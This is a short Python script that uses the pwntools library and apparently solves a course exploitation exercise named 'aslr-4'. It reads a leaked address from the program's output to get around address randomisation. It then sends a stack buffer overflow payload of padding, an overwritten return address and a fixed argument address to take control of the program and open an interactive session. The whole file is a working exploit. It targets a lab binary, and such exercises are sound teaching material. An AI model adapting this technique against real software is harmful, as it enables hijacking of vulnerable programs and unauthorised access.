#!/usr/bin/env python

from pwn import *
import os

env = {
    "PATH": "/home/users/hobbes/week4/aslr-4"
}

context.terminal = ['tmux', 'splitw', '-h']
p = process('./aslr-4', env=env)
#gdb.attach(p, "b *input_func +100")

address = p.recv()
address = address[66:76]

address = int(address, 0) - 0xe8d0
print(hex(address))

buf = "A" * 0x8c + p32(address) + "BBBB" + p32(0x80482a7)

p.sendline(buf)

p.interactive()
